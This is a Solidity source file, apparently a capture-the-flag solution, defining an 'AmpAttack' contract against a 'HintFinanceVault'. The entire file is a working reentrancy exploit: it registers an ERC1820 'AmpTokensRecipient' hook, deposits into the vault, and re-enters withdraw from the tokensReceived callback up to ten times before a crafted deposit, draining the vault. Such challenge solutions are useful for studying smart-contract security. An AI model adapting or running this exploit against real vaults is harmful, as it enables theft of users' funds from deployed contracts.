// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../contracts/Setup.sol";
import "./Common.sol";

contract AmpAttack is AttackBase {
    IERC1820Registry constant erc1820Registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    ERC20Like underlying;
    HintFinanceVault vault;

    uint256 numShares;
    uint256 numWithdraws;

    constructor(ERC20Like _underlying, HintFinanceVault _vault) payable {
        underlying = _underlying;
        vault = _vault;

        underlying.approve(address(vault), type(uint256).max);

        swapEthToToken(_underlying, msg.value);
    }

    function attack() public {
        erc1820Registry.setInterfaceImplementer(address(this), keccak256("AmpTokensRecipient"), address(this));

        vault.deposit(underlying.balanceOf(address(this)));
        numShares = vault.balanceOf(address(this));

        numWithdraws = 1;
        vault.withdraw(numShares);
    }

    // AMP hook
    function tokensReceived(bytes4, bytes32, address, address, address, uint256, bytes calldata, bytes calldata)
        external
    {
        if (numWithdraws < 10) {
            ++numWithdraws;
            vault.withdraw(numShares);
        } else {
            vault.deposit(numWithdraws * numShares * underlying.balanceOf(address(vault)) / vault.totalSupply());
        }
    }
}
